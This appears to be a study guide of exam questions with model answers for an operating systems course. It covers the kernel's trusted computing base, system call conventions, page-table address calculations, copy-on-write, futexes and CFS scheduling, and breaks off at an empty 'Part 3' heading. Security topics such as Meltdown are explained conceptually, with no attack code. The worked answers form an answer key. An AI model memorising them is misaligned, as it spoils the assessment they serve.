---
subject: COMP60261
chapter: 3
title: "Chapter 3 Exam Questions - Fable 5"
language: "en"
---

# COMP60261 — Chapter 3 Exam Questions

**Author:** Fable 5
**Scope:** Operating systems, part 1 — what the kernel is and the security goals it enforces; how kernel code actually gets onto the CPU; processes, scheduling and memory management.

**Assumed platform for every calculation: x86-64 Linux, 48-bit virtual addresses, 4 KB pages, 4-level page tables.** Throughout, *OS* means *kernel*, following the unit's convention.

| Quantity | Value |
|---|---|
| Page size | 4 KB |
| Virtual address width | 48 bits → 256 TiB per process |
| Page table levels | 4 (5-level designs emerging) |
| Entries per translation page | 512 (512 × 8 bytes = 4 KB) |
| Page table root register | `%cr3` |
| World switch (user↔kernel) | hundreds to thousands of cycles |
| Protection rings on x86-64 | 0 (supervisor) and 3 (user) only |

> **On the calculations in Part 2.** Every address decomposition, table count, page tally and scheduler figure below was computed and checked numerically, including reassembling each decomposed virtual address from its extracted fields to confirm the bit ranges are right. Where a question needs Linux's CFS weight table, the weights are given in the question so the arithmetic is self-contained.

---

## Part 1: Conceptual & Security Fundamentals

### Question 1 — The Trusted Computing Base

**Q:** Define the Trusted Computing Base and state the three requirements it must satisfy. List its typical membership. Then explain why the lecturer describes a "secure operating system" as an oxymoron, and connect that claim to Chapter 2.

**Answer & Explanation:**

**Definition.** The TCB is the set of components that enforce a system's security goals.

**The three requirements** — this is the classic *reference monitor* definition and is worth memorising as a triple:

1. **It must mediate all security-sensitive operations** — nothing may bypass it. This is *complete mediation*: a check that can be routed around is not a check.
2. **It must be correct** — it must actually implement the intended policy.
3. **It must not be tamperable** by software outside the TCB.

**Typical membership:** the **hardware**, the **boot process**, **all OS (kernel) code**, and **some privileged applications**.

**The two honest admissions** that accompany this, both examinable:

* The TCB can be **hard to define precisely** — the boundary is a judgement, not a fact of the code.
* It is **mostly impossible to formally prove correct**.

**Why "secure OS" is an oxymoron.** No system of modern complexity is fully secure. A secure OS is an **ideal goal, not an achievable state**. The argument is a syllogism the two chapters make jointly:

* The security of the whole system rests on the TCB being correct (requirement 2).
* The TCB is dominated by very large programs — a monolithic kernel is millions of lines — written in **memory-unsafe languages**.
* Chapter 2 established that such programs **will** contain memory-safety vulnerabilities, that the compiler will not warn about most of them, and that no practical technique can guarantee their absence. Around **70%** of Microsoft's and Google's reported security bugs were memory-safety violations.
* Therefore requirement 2 cannot be *established*, only assumed.

**Why this framing matters for the rest of the unit.** Because security cannot be achieved outright, the discipline reorganises around what *can* be done: **reduce the TCB** so there is less code to trust; **state a threat model** so "secure" becomes a claim with a scope; and **layer mitigations** so a single failure is not total. A question asking "why can we not simply build a secure OS?" is asking for this argument, not for a list of bugs.

**The distinction that supports TCB reasoning.** The **kernel** (Linux, Windows NT, XNU) is the core managing CPU, memory and devices; a **distribution** (Ubuntu, Fedora, Debian) is the kernel *plus* utilities, libraries, package manager and applications. A vulnerability in a distribution's userspace daemon is a fundamentally different problem from one in the kernel, because **the kernel is in the TCB of everything on the machine.**

---

### Question 2 — When does kernel code actually run?

**Q:** State the only occasions on which kernel code executes, and the categories of event involved. Where does a system call fit in that taxonomy? Give the important consequence for how you should think about the kernel.

**Answer & Explanation:**

**The kernel runs on exactly two occasions:**

1. **At boot**, once the boot loader has loaded it.
2. **At runtime, when an interrupt is received by the processor.**

**And there are two types of interrupt:**

* **Hardware interrupts** — raised for I/O; a **device** signals the CPU.
* **Software exceptions** — for example division by zero; the **CPU interrupts itself**.

**Where a system call fits — and this is the unit's specific framing.** A system call is **not a third category**. It is a **software exception**, deliberately triggered by executing a special instruction (`syscall` on x86-64). Many textbooks present syscalls, interrupts and exceptions as three peers; this unit *derives* the syscall from the exception mechanism, and an answer that shows the derivation is stronger than one that lists three items.

**The consequence, which is the real point of the question.** Between these events **the kernel is not running.** It is **not a process** with its own scheduled thread; it is a body of privileged code entered on demand, which executes **in the context of whatever it interrupted**, and then returns.

Three things follow directly, and each recurs later:

* **The kernel can only act at interrupt boundaries.** This is why preemption is *deferred*: the scheduler sets a per-CPU flag, and the flag is checked **on return from an interrupt** (Question 12). The kernel cannot preempt a thread at an arbitrary instant, because at an arbitrary instant it is not executing.
* **Signal delivery has the same shape.** The kernel checks for pending signals **immediately before returning to userspace**, because that is the moment it is running and holds the userspace context.
* **Every kernel entry costs a world switch** of hundreds to thousands of cycles, which is the justification behind futexes, shared memory, `malloc` living in libc, and mapping the kernel into every address space.

**The boot sequence**, for completeness, since it establishes the initial TCB: power on → motherboard firmware (BIOS/UEFI) initialises hardware and runs the boot loader → the boot loader (e.g. GRUB) loads the **kernel** → the kernel initialises hardware and itself → it can then run applications. This ordering is why "a compromised boot process loading a rootkit" is a listed threat, and why secure and measured boot exist: everything above a compromised boot loader inherits the compromise.

---

### Question 3 — API versus ABI, and the system call convention

**Q:** A C program calls `read()`. Explain why a source-level API is insufficient to reach the kernel and what is required instead. Give the x86-64 Linux system call convention precisely. Then state how it differs from the ordinary function-calling convention and explain **why** it differs.

**Answer & Explanation:**

**Why an API is not enough.** `read()` and `write()` are functions implemented by **libc**, which is compiled *together with* the application and therefore exposes a source-level **API**. But libc must invoke the **kernel**, which is:

* **not compiled together with the application**, and
* possibly **written in a different language**.

An API is an agreement between things a compiler can see at once. Here there is no such shared compilation, so the agreement must be at the **machine-language level**: an **ABI**, specifying exactly *which values go in which registers* and *what instruction to execute*. Linux uses the **System V ABI**.

> The reasoning to reproduce in an exam: *different compilation units, possibly different languages, therefore the contract must be binary, not source-level.*

**The x86-64 Linux system call convention:**

1. Place the arguments, in order, in **`%rdi`, `%rsi`, `%rdx`, `%r10`, `%r8`, `%r9`** (a maximum of six).
2. Place the **system call id** — a unique integer — in **`%rax`**.
3. Execute the **`syscall`** instruction. This triggers the exception and traps to the kernel.
4. On return to userspace, the kernel has left the **return value in `%rax`**.

Doing this by hand in assembly is instructive precisely because it shows **there is nothing magical about libc**: it is a thin wrapper that loads registers and executes one instruction.

**How it differs from the function-calling convention, and why.** The ordinary x86-64 SysV function call uses `%rdi`, `%rsi`, `%rdx`, **`%rcx`**, `%r8`, `%r9`, returning in `%rax`. The syscall convention substitutes **`%r10` for `%rcx`**.

**The reason is the hardware.** The `syscall` instruction itself **clobbers `%rcx`** — it stores the return address (the RIP to resume at) into `%rcx`, and the saved RFLAGS into `%r11`. A fourth argument placed in `%rcx` would therefore be destroyed by the very instruction meant to deliver it. `%r10` is used instead.

**The two conventions are different conventions from the same ABI document**, and confusing them is a listed trap. Being able to state both *and* the hardware reason for the difference is the complete answer.

**The world switch, step by step.** On `syscall`: the CPU switches from **user mode to supervisor mode**; it jumps to a **predefined** location — the **system call handler**; the kernel handles the request; the kernel executes **`sysret`**, which returns to user mode at the instruction after `syscall`.

**Note the security property in the word "predefined".** The target is fixed by the kernel, **not chosen by the caller**. Userspace selects *which service* it wants via the id in `%rax`; it never selects *where to jump*. That is a control-flow-integrity property built into the interface: the syscall boundary offers a numbered menu, not an address.

---

### Question 4 — The two mechanisms that enforce memory isolation

**Q:** State the two invariants the OS must maintain for memory isolation and name the distinct mechanism enforcing each. Explain why the kernel is mapped into every process's address space despite being inaccessible from user mode, and what Meltdown did to that arrangement.

**Answer & Explanation:**

**The two invariants and their mechanisms** — this table is the summary of the whole memory-management lecture, and the two entries are **different kinds of mechanism**:

| Invariant | Mechanism | Kind of enforcement |
|---|---|---|
| A process's memory is not accessible from **other processes** | **Different page tables** — one per process, describing disjoint, non-overlapping mappings | **Separation.** A process cannot even *name* an address it does not have mapped |
| **Kernel** memory is not accessible from processes | The **user/supervisor bit** in the page table entries, within each address space | **Permission.** The mapping exists and is nameable, but access from ring 3 faults |

Both are **hardware** features that the OS merely *configures*: the OS sets policy, the **MMU enforces it on every load and store**. The first is enforcement by construction — an unmapped address is inexpressible — rather than enforcement by checking.

**Why the kernel is mapped into every address space.** Because the user/supervisor bit exists, the kernel *can* safely be mapped into every process's address space — in Linux, at the **top** — with that region marked supervisor-only. The payoff is large: **no page table switch is needed on a system call.** Switching page tables means writing `%cr3`, which entails **flushing the TLB**, the translation cache, and a cold TLB then costs a full 4-level walk for every subsequent access until it refills. Given that syscalls are frequent and already cost hundreds of cycles, avoiding a TLB flush per syscall is a major optimisation.

**What Meltdown changed.** Meltdown breaks the **second** mechanism — not logically, but **microarchitecturally**. The permission check is enforced for the *architectural* result, but the data is speculatively loaded before the check resolves and leaves a measurable trace in the cache, letting an unprivileged process infer kernel memory it could never legitimately read. Note the asymmetry: the first mechanism (separate page tables) is untouched, because it never relied on a permission check in the first place.

The mitigation, **KPTI** (kernel page-table isolation), has to **undo the optimisation** — the kernel is no longer fully mapped in the user address space, so a syscall must switch page tables after all, paying exactly the TLB-flush cost the original design existed to avoid. This is the cleanest example in the unit of a **security/performance trade being re-priced**: the optimisation was correct given the architectural model, and a microarchitectural leak invalidated the model rather than the code.

**Privilege modes, for completeness.** Some instructions are **privileged** — installing a page table, communicating with hardware, resetting the CPU. At any moment the CPU is in **user mode** or **supervisor (kernel) mode**. A privileged instruction succeeds in kernel mode and **triggers an exception, trapping to the kernel, when attempted in user mode.** Note the elegance: an attempted violation is itself routed to the kernel, so the kernel decides what happens next. On x86 these modes are **protection rings**; x86-32 had rings 0–3, but **rings 1 and 2 were dropped with x86-64**, leaving only ring 0 and ring 3.

---

### Question 5 — Race conditions, atomicity, and the futex

**Q:** Define a race condition and a critical section. Give the **complete** definition of the atomicity that critical sections require. Then explain why the kernel must be involved in locking at all, and how a futex avoids it in the common case.

**Answer & Explanation:**

**Race condition.** Concurrent reads and writes to shared data whose outcome depends on timing. The canonical failure the lecture uses: a process is **preempted in the middle of updating a large data structure**; a second process is scheduled and reads the **inconsistent, half-updated** structure.

**Critical section.** Code in which processes (or threads) access shared data.

**Atomicity — both rules.** To avoid races, critical sections must execute atomically, which requires:

1. A critical section can be executed by only **one process at a time**; **and**
2. Once a process **starts** executing a critical section, it must **finish** it before another process may start executing that critical section.

> **This is the most commonly half-answered definition in the chapter.** Rule 1 alone is mutual exclusion, which is what most answers give. Rule 2 — no interleaving once started — is what actually rules out the half-updated-structure scenario. Give both.

**Locks, and why the kernel is involved.** The protocol: both parties attempt to take the lock; exactly one succeeds; the winner runs its critical section while **the loser is put to sleep by the OS**; on release the sleeper is woken, retries, acquires, and proceeds.

The kernel **must** be involved because **only the kernel can put a thread to sleep and wake it.** Sleeping means being removed from the runqueue, which is a scheduler operation, and the scheduler is kernel code. Historically this meant a **system call on every lock and every unlock** — very expensive, given that each crossing costs hundreds to thousands of cycles.

**The futex — "fast userspace mutex".** The lock is implemented **partially in userspace**:

* A **shared userspace variable** records whether the lock is free, manipulated with **atomic CPU instructions** (a compare-and-swap), which need no kernel involvement.
* The kernel is entered **only when actually needed** — when a thread must be put to sleep, or woken.

So in the **uncontended** case, a lock and unlock pair completes with **zero system calls**, saving two world switches. Only on genuine contention is the `futex` syscall issued.

**The pattern to name.** This is a **fast path in userspace, slow path in the kernel**, and it recurs across the chapter: `malloc` amortising `mmap` over many small allocations; shared memory avoiding per-access kernel involvement; the kernel mapped into every address space to avoid a per-syscall page-table switch. All four are the same move — **identify the common case, handle it without crossing the boundary, and pay the crossing only in the rare case.** If an exam question asks *why* a mechanism avoids the kernel, the answer is the cost of the world switch.

---

### Question 6 — Threads versus processes, and what is actually scheduled

**Q:** Define a thread and state precisely what threads of one process share. Explain what the OS considers the schedulable entity, and give the observable consequence in the system call interface. Then state the security implication for sandboxing.

**Answer & Explanation:**

**Definition.** A thread is an **execution flow within a process**. Every process has at least one — the flow beginning at the program's entry point at load time. More can be created, for instance with `pthread_create`.

**What they share, and how.** The defining property is that **threads of the same process share the same address space** — and the *implementation* of that sharing is the examinable detail: they **literally use the same page table**. Consequences:

* They can communicate through **global variables** and by **exchanging pointers**, with no IPC mechanism and no kernel involvement.
* Because they **run concurrently**, that shared access creates **race conditions** and the need for the synchronisation of Question 5.
* A context switch **between threads of one process skips the address-space switch**, since `%cr3` already holds the right page table — one reason thread switches are cheaper than process switches.

**What the OS schedules.** From the kernel's point of view a thread is a **task — the smallest schedulable entity**. Threads are created with the **same system call as `fork`: `clone`**.

> **The high-value claim: the OS does not schedule processes; it schedules threads.** Any scheduling answer that says "the scheduler picks the next process" is using the wrong model.

**The observable consequence.** All threads of a process report the **same PID**, but each has a unique **TID** (thread identifier) — and **many scheduler-related system calls take a TID, not a PID**, precisely because threads, not processes, are what gets scheduled. That PID/TID asymmetry is the visible fingerprint of the model.

**The security implication.** Threads share one page table, so **there is no memory isolation between threads of a process whatsoever** — none of Question 4's first mechanism applies, because there is only one address space. A memory-safety bug in any thread is a bug affecting all of them.

This is exactly why **sandboxing untrusted code uses separate processes, not threads**. Multiprocess applications — browsers, servers — accept the cost of IPC and world switches specifically to obtain the page-table separation that threads by definition cannot provide. The trade is explicit: threads give you cheap communication *because* they abandon isolation; processes give you isolation *because* they pay for communication. Chapter 5's compartmentalisation is this decision applied systematically.

---

## Part 2: Memory & Storage Size Calculations

### Question 7 — The address space, and why the page table is a tree

**Q:** For 48-bit virtual addresses and 4 KB pages:

1. How large is one process's virtual address space, in bytes and in TiB?
2. How many 4 KB pages does it contain?
3. If the page table were a flat array with one 8-byte entry per virtual page, how much memory would it need **per process**?
4. Use that figure to explain why a tree is used, and show that the "4 levels of 512 entries" design is not arbitrary.

**Answer & Explanation:**

**1 — Size of the address space.**

```
2^48 = 281,474,976,710,656 bytes
     = 2^48 / 2^40 TiB = 2^8 = 256 TiB
```

**2 — Number of pages.** A 4 KB page is 2¹² bytes, so:

```
2^48 / 2^12 = 2^36 = 68,719,476,736 pages
```

**3 — Cost of a flat page table.** One 8-byte entry per page:

```
2^36 entries × 8 bytes = 2^36 × 2^3 = 2^39 bytes
                       = 549,755,813,888 bytes
                       = 512 GiB per process
```

**4 — Why a tree.** 512 GiB of translation data **per process**, to describe an address space that is **almost entirely unmapped**, is absurd: it exceeds the physical memory of essentially every machine, and would have to be duplicated for every process. A 64-bit address space is extremely **sparse**, and the flat design pays in proportion to the space's *size* rather than to the amount actually *mapped*.

A **tree** pays in proportion to what is mapped. An entry is either **present**, referring to a page at the next level down, or **absent**, meaning that entire range of the address space is unmapped — and an absent entry near the root prunes an enormous subtree at the cost of one 64-bit slot. Absent entries at each level prune:

| Level | One absent entry leaves unmapped |
|---|---|
| 1st level (leaf) | 4 KB |
| 2nd level | 512 × 4 KB = **2 MiB** |
| 3rd level | 512 × 2 MiB = **1 GiB** |
| 4th level (root) | 512 × 1 GiB = **512 GiB** |

**Why the parameters are mutually determined, not chosen independently.** A translation page is one page, 4 KB, and each entry is 8 bytes, so a table holds `4096 / 8 = 512` entries. Indexing 512 entries takes `log₂512 = 9` bits. The page offset takes 12 bits, since a page is 2¹² bytes. Therefore:

```
4 levels × 9 index bits + 12 offset bits = 36 + 12 = 48 bits
```

which is exactly the virtual address width. **The level count, the entries per level, the page size and the address width are one interlocking design** — pick the page size and the entry width and the rest follows. This is also why 5-level paging goes with **57-bit** addresses (`5 × 9 + 12 = 57`): another level buys exactly nine more bits.

---

### Question 8 — Decomposing a virtual address and completing the translation

**Q:** The MMU is asked to translate the virtual address `0x00007F3CA81B2C40`.

1. Extract the four page-table indices and the page offset, giving each in decimal and hexadecimal.
2. Is this a canonical address, and is it a user or kernel address?
3. If the walk ends at a 1st-level entry holding physical frame number `0x1A2B3`, what is the resulting physical address?
4. How many memory accesses does this translation cost, and what makes the cost disappear on a subsequent access to the same page?

**Answer & Explanation:**

**1 — The bit fields.** The address splits as follows, which is worth writing out because the boundaries are what the question tests:

| Bits | Field | Value (dec) | Value (hex) |
|---|---|---|---|
| 39–47 | index into the **root / 4th-level** page (from `%cr3`) | 254 | `0xFE` |
| 30–38 | index into the **3rd-level** page | 242 | `0xF2` |
| 21–29 | index into the **2nd-level** page | 320 | `0x140` |
| 12–20 | index into the **1st-level** page | 434 | `0x1B2` |
| 0–11 | **offset** within the 4 KB page | 3136 | `0xC40` |

Extracting each field is a shift and a mask — `(VA >> 39) & 0x1FF` for the root index, and so on, with `0x1FF` masking nine bits. Laid out in binary, with the fields grouped:

```
0000000000000000 | 011111110 011110010 101000000 110110010 | 110001000000
   bits 48-63    |   L4=254    L3=242    L2=320    L1=434  |  offset=3136
```

Reassembling `(254 << 39) | (242 << 30) | (320 << 21) | (434 << 12) | 3136` returns `0x7F3CA81B2C40`, which confirms the boundaries are correct.

**2 — Canonical, and which half.** Bit 47 is **0**, so for the address to be **canonical** bits 48–63 must all be 0 — they are (`0x0000`), so **yes, it is canonical**. Because bit 47 is 0 it lies in the **lower half** of the space, so this is a **user address** — consistent with the `0x00007F…` range where Linux places `mmap` regions, shared libraries and the stack. A kernel address would have bit 47 set and therefore bits 48–63 all set, giving the familiar `0xFFFF8…` form. An address that is neither all-zeros nor all-ones in the top 16 bits is **non-canonical** and the CPU faults on use rather than silently ignoring the bits.

**3 — The physical address.** The 1st-level entry supplies a **frame number**, not an address, so it must be shifted into place, and the offset is carried through the translation unchanged:

```
frame base = 0x1A2B3 << 12 = 0x1A2B3000
PA         = 0x1A2B3000 | 0xC40
           = 0x1A2B3C40   (= 439,041,088)
```

**Two details worth stating.** The offset is **never translated** — the low 12 bits pass through untouched, which is why translation granularity *is* the page size. And a PTE stores a frame *index* rather than a full address, which is why roughly **36 bits** suffice for the reference and the remaining bits of the 64-bit entry are free for metadata (Question 9).

**4 — The cost.** The walk reads one translation page per level: **4 memory accesses**, then **1 more** for the data itself — **5 accesses to satisfy one load**. That is why translations are cached in the **TLB**: on a subsequent access to the same page the walk is skipped entirely and the cost is **1 access**.

This is also the hidden cost behind two things elsewhere in the chapter. Writing `%cr3` on a process switch **flushes the TLB**, so the next accesses each pay the full 5-access walk until it refills — which is why mapping the kernel into every address space to avoid a `%cr3` write per syscall is worth so much (Question 4), and why KPTI hurt.

---

### Question 9 — The memory cost of mapping a region

**Q:** A process maps a contiguous **1 GiB** region, all of it actually populated, with 4 KB pages.

1. How many 1st-level entries are required?
2. How many translation pages are needed at each of the four levels?
3. What is the total memory consumed by the page tables, and what percentage of the mapped region is that?
4. Which page-table metadata bits make the on-demand version of this mapping possible?

**Answer & Explanation:**

**1 — Leaf entries.** One 1st-level entry per 4 KB page:

```
1 GiB / 4 KB = 2^30 / 2^12 = 2^18 = 262,144 entries
```

**2 — Tables per level.** Each translation page holds 512 entries, so each level needs `ceil(entries / 512)` tables, and the count collapses fast:

| Level | Entries needed | Tables | Each table covers |
|---|---|---|---|
| 1st (leaf) | 262,144 | `262,144 / 512` = **512** | 2 MiB |
| 2nd | 512 | `512 / 512` = **1** | 1 GiB |
| 3rd | 1 | **1** | 512 GiB |
| 4th (root) | 1 | **1** | 256 TiB |

The 1 GiB region is a **perfect fit for exactly one 2nd-level table**: 512 entries × 2 MiB each = 1 GiB. That is not a coincidence of this question — it is why 1 GiB and 2 MiB are the natural "huge page" sizes on x86-64. They are precisely the ranges spanned by one 3rd-level and one 2nd-level entry, so a huge page is implemented by stopping the walk early and treating that entry as a leaf.

**3 — Total cost.**

```
tables = 512 + 1 + 1 + 1 = 515
bytes  = 515 × 4 KB = 2,109,440 bytes ≈ 2.01 MiB
overhead = 2,109,440 / 1,073,741,824 = 0.196%
```

So **about 2 MiB of page tables to map 1 GiB — under 0.2% overhead.** Compare Question 7's flat design at 512 GiB *per process regardless of usage*: the tree's cost scales with what is mapped, and the fixed part (one table each at the top three levels) is 12 KB.

Note also where the cost sits: **99.4% of it is the 512 leaf tables**, which is the general shape — the leaves dominate, and the upper levels are nearly free. Using 2 MiB huge pages here would eliminate all 512 leaf tables and map the same gigabyte with 3 tables, at the cost of coarser protection granularity.

**4 — The bits behind on-demand mapping.** Roughly 36 bits of each 64-bit entry reference the next level, leaving the rest for metadata:

* **Present** — is this range actually mapped?
* **Read/write** — may it be written?
* **User/supervisor** — is it reachable from user mode, or supervisor only?

An access to a **non-present** page, or a **denied** access such as a write to a read-only page, raises a **page fault exception**. On-demand mapping works by **leaving the present bit unset**: the kernel reserves physical memory and creates the entries, but the first access faults, and the fault handler completes the mapping and restarts the instruction. So of the ~2 MiB computed above, the kernel need not populate the leaf entries until they are touched.

> **The unification worth stating in an answer.** These metadata bits exist essentially *because there were spare bits in the entry*, and one mechanism — the present and permission bits plus the page-fault exception — implements **three separate features**: memory protection, copy-on-write, and swapping. Three features, one hardware hook.

---

### Question 10 — The cost of crossing into the kernel

**Q:** A world switch costs 500–1000 cycles on a 3 GHz CPU.

1. How much wall-clock time does an application spend on switches if it performs 1,000,000 system calls, at each end of that range?
2. Two processes exchange 1,000,000 messages. Estimate the switch cost via a pipe (one `write` and one `read` per message) versus shared memory.
3. How many system calls does an uncontended futex lock/unlock pair require, and how many does the historical implementation require?
4. Is `malloc` a system call? Justify your answer and relate it to the same pattern.

**Answer & Explanation:**

**1 — A million system calls.**

```
at  500 cycles: 1,000,000 × 500  = 5 × 10^8 cycles / 3×10^9 Hz = 0.167 s
at 1000 cycles: 1,000,000 × 1000 = 1 × 10^9 cycles / 3×10^9 Hz = 0.333 s
```

**A sixth to a third of a second consumed purely by boundary crossings** — before any of the work the calls were made to do. This is the number that justifies every kernel-avoidance mechanism in the chapter.

**2 — Pipe versus shared memory.** A pipe needs **two** crossings per message, one `write` and one `read`:

```
2,000,000 switches × 1000 cycles = 2 × 10^9 cycles ≈ 0.67 s of pure overhead
```

Shared memory requires the `mmap` calls to establish the mapping — a **fixed, one-off** cost of a handful of switches — and then **no kernel involvement per access at all**, because both processes' page tables point at the **same physical pages** and reads and writes are ordinary loads and stores. The per-message cost falls to approximately zero, so the total drops from ~0.67 s to microseconds.

**Two caveats a complete answer includes.** Shared memory provides **no synchronisation** — you must add it yourself (Questions 5 and 23), and the kernel is no longer present to serialise anything. And it deliberately **punctures isolation**: it is the fastest IPC mechanism precisely because it removes the kernel from the data path, which is the same reason it is the most dangerous. Pipes and sockets, by contrast, use **kernel buffers** and let the kernel **put processes to sleep** — a writer to a full pipe, a reader from an empty one — which is a service you lose entirely with shared memory.

**3 — Futex accounting.**

| | lock | unlock | total |
|---|---|---|---|
| Historical | 1 syscall | 1 syscall | **2** |
| Futex, uncontended | 0 | 0 | **0** |
| Futex, contended | 1 (`FUTEX_WAIT`) | 1 (`FUTEX_WAKE`) | 2 |

The uncontended path is an **atomic compare-and-swap on a shared userspace variable** and nothing more, saving both crossings — roughly 2000 cycles per lock/unlock pair, which for a lock taken millions of times is the difference between a negligible and a dominant cost.

**4 — `malloc` is not a system call.** It is a **libc function implemented in userspace**. It obtains memory in bulk from the kernel with **`mmap`** (or `brk`), then **subdivides that region** in userspace to satisfy individual requests. A program making a million small allocations therefore performs a handful of `mmap` calls, not a million syscalls.

**The pattern, stated once for all four cases:** identify the common case, handle it **without crossing the boundary**, and pay the crossing only when the kernel is genuinely required — because only the kernel can put a thread to sleep, install a mapping, or touch hardware. The same reasoning produces futexes, userspace `malloc`, shared memory over pipes, and the kernel being mapped into every address space to avoid a `%cr3` write per syscall.

---

### Question 11 — Copy-on-write accounting

**Q:** A parent process has **4 MiB** of memory mapped and calls `fork`. The child then writes one byte to each of **3 distinct pages** and reads from many others.

1. How much physical memory is consumed immediately after `fork`, and what has actually been duplicated?
2. How much after the child's three writes?
3. What would an eager, full copy have cost, and how much is saved?
4. How many page faults does this incur, and what does the handler do at each?
5. Why is copy-on-write especially well matched to how `fork` is used in practice?

**Answer & Explanation:**

**Setup.** `4 MiB / 4 KB = 1024 pages` mapped in the parent.

**1 — Immediately after `fork`.** Physical memory for the mapping is still **1024 pages (4 MiB)**. What is duplicated is the **page table**, not the data: the child receives a **copy of the parent's page table**, so the two address spaces are identical and every mapped virtual page in both points at the **same physical page**. Those shared pages are marked **read-only** in both. The child also receives copies of the **file descriptors** and the **execution context** (register values) — which is why the return path is executed by both processes, and why `fork` appears to return twice.

**Read accesses proceed normally.** As long as neither party writes, there is no reason for them to observe different content, so sharing is invisible.

**2 — After three writes.** Each write to a read-only shared page triggers a fault, and the handler copies **that one page**:

```
1024 shared + 3 newly copied = 1027 pages = 4,206,592 bytes ≈ 4.01 MiB
```

The **copy granularity is one page — 4 KB** — so writing a single byte costs a full 4 KB copy. This is a detail worth naming: the cost is not proportional to the bytes written but to the *pages touched*.

**3 — Eager copy, and the saving.**

```
eager: 2 × 1024 = 2048 pages = 8 MiB
CoW:                 1027 pages ≈ 4.01 MiB
saved: 1021 pages ≈ 3.99 MiB — about 50% of the total, or 99.7% of the copy
```

**4 — Page faults.** Exactly **3** — one per first write to a distinct page. Subsequent writes to an already-copied page are ordinary writes to private, writable memory and cost nothing extra. At each fault the handler: allocates a fresh physical page; copies the 4 KB of contents; updates the faulting process's page table entry to point at the new page and marks it **writable**; and restarts the faulting instruction, which now succeeds. Reads never fault, which is why a read-mostly child is essentially free.

**5 — Why it matches how `fork` is used.** The dominant idiom is **`fork` + `execve`**: the parent forks, and the child immediately calls `execve` to run a different program. But `execve` **creates a new, blank address space and the duplicated one is completely lost**. So an eager copy would have duplicated megabytes or gigabytes and then **discarded all of it microseconds later**. Copy-on-write reduces that to duplicating a page table, and the few pages the child touches between `fork` and `execve` are all that is ever copied.

> **Answering CoW questions.** They come in two directions — *why* (copying gigabytes is wasteful, and usually discarded immediately by `execve`) and *how* (shared physical pages marked read-only; a write faults; the handler copies one page and remaps). Give the **4 KB granularity** either way; it is the concrete detail that distinguishes a strong answer. And do **not** describe `fork` as copying the address space eagerly — that is a listed trap.

---

### Question 12 — CFS timeslices and `vruntime`

**Q:** Two threads are runnable on one core. Thread A has nice 0 (weight **1024**); thread B has nice 5 (weight **335**). CFS uses a 24 ms period in which every runnable thread must run at least once, and `vruntime = time spent running / weight`.

1. Compute each thread's timeslice.
2. Both start with `vruntime = 0`. After each has run for 10 ms, give both `vruntime` values and say which thread the scheduler picks next, and why.
3. How long must A run for its `vruntime` to reach B's value after B's 10 ms? What CPU-share ratio does this imply?
4. State both conditions that cause a running thread to be preempted, and explain how CFS delivers interactive responsiveness with no special case for interactive tasks.
5. How is the runqueue structured, what are the operation costs, and why is there one per core?

**Answer & Explanation:**

**1 — Timeslices, proportional to weight.**

```
total weight = 1024 + 335 = 1359

A: 24 ms × 1024 / 1359 = 18.084 ms
B: 24 ms ×  335 / 1359 =  5.916 ms
                          ------
                          24.000 ms  ✓
```

Note the ratio `1024 / 335 = 3.057`: **A receives about 3.06× the CPU time of B**, which is the intended effect of five nice levels, each step being roughly a factor of 1.25 (`1.25^5 ≈ 3.05`).

**2 — `vruntime` after 10 ms each.**

```
A: 10 / 1024 = 0.009766
B: 10 /  335 = 0.029851
```

The scheduler always picks the thread with the **smallest `vruntime`**, so it picks **A**. The mechanism is worth stating plainly: both threads consumed the *same* real time, but B's higher-priority-cost divisor is smaller, so the same 10 ms of real CPU is charged to B as **3.06× more virtual time**. `vruntime` is *not* time — it is **time deflated by entitlement**, and fairness is enforced by equalising it.

**Watch the direction of the nice value.** The **higher** the nice value, the "nicer" the thread — the more willing it is to let others run — so nice 5 means **lower** priority and a **smaller weight**. Nice and weight move in opposite directions, which is a listed trap.

**3 — How long A must run to catch up.**

```
vruntime_A = vruntime_B  →  runtime_A / 1024 = 0.029851
runtime_A = 0.029851 × 1024 = 30.567 ms
```

So **A runs 30.567 ms for every 10 ms B runs** — a ratio of `30.567 / 10 = 3.057`, exactly `1024 / 335`. The weight ratio and the CPU-share ratio are the same number, which is the property that makes the scheme "completely fair": equal `vruntime` means CPU time distributed in proportion to weight.

**4 — The two preemption triggers.** A running thread is preempted when **either**:

1. it **exceeds its timeslice** and other threads are ready to run; **or**
2. **another thread with a smaller `vruntime` wakes up**.

> Most answers give only the first. The **second is what delivers interactive responsiveness**, and it is the one to make sure you state.

**Why interactivity needs no special case.** While a thread is **blocked** — waiting on the keyboard, a disk, a socket — it **accumulates no `vruntime` at all**, because it is not running. Meanwhile a CPU-bound thread's `vruntime` climbs steadily. So when the interactive thread wakes, its `vruntime` is far *behind*, placing it at or near the leftmost position, and trigger 2 fires: it **preempts the CPU-bound thread immediately**.

Older schedulers needed heuristics to *detect* interactive tasks and boost them, and the O(1) scheduler (2003), despite constant-time decisions, had exactly these problems with interactive tasks. CFS (Linux **2.6.23**, 2007) gets the behaviour **for free from the fairness rule**, because blocking simply *is* not accumulating `vruntime`. Being able to state that is worth more than reciting the formula.

Note also that **perfectly equal CPU shares would be the wrong goal.** A text editor needs very few cycles but needs them *promptly*; a video encoder wants everything left over and does not mind being preempted. Good scheduling is not equal division but **matching each task's actual need** — which is why fairness is defined over weighted virtual time rather than raw time.

**5 — The runqueue.** Runnable threads are held in a **red-black tree**, sorted by **increasing `vruntime`**:

* The **next thread to run is always the leftmost node** — found in **O(1)**.
* Insert, delete, rebalancing and recolouring are **O(log n)**, which keeps scheduler overhead low as thread counts grow. This is what the older algorithms — FCFS, round robin, plain priority scheduling, multilevel feedback queues — failed to deliver at modern core counts and thread counts.

**There is one runqueue per core**, because a single shared runqueue would need locking on every scheduling decision and **would not scale** across cores. The cost of that choice is that runqueues must be kept **balanced** — you do not want one core loaded with many high-priority threads while another holds one low-priority thread — so a relatively complex **load balancing** algorithm migrates threads between runqueues, weighing thread **priorities**, the **number of threads** per runqueue, and the system **topology** (cache hierarchy, SMT, NUMA), because migrating a thread forces it to **rebuild its cache state** on the target core.

**Preemption is deferred, not instantaneous.** When the scheduler decides preemption is needed, a **per-CPU flag** is set; the flag is **checked on return from an interrupt** — a syscall, exception, or hardware interrupt — and preemption happens at that point. If a different thread is to run, a **context switch** occurs: **switch the address space** (write the page-table root register) and **switch the CPU state** (the registers). Threads of the *same* process share a page table, so switching between them **skips the address-space switch**. The deferral is a direct consequence of Question 2: the kernel can only act when it is running, and interrupts are the only moments it is.

---

## Part 3: Code Tracing & Output Prediction

